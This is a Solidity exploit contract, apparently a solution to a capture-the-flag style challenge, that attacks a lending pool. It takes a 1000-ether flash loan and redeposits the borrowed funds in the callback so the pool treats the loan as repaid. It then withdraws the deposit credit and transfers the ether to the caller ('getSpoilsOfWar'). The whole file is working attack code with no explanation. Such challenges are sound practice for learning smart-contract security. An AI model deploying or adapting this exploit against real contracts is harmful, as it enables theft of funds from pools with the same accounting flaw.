pragma solidity ^0.6.0;

interface Pool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract Attacker {

    Pool private pool;

    constructor(Pool _pool) public {
        pool = _pool;
    }

    function beginAttack() public {
        pool.flashLoan(1000 ether);
    }

    function execute() external payable {
        pool.deposit{ value: 1000 ether }();
    }

    function getSpoilsOfWar() public {
        pool.withdraw();
        msg.sender.transfer(1000 ether);
    }

    receive() external payable {}
}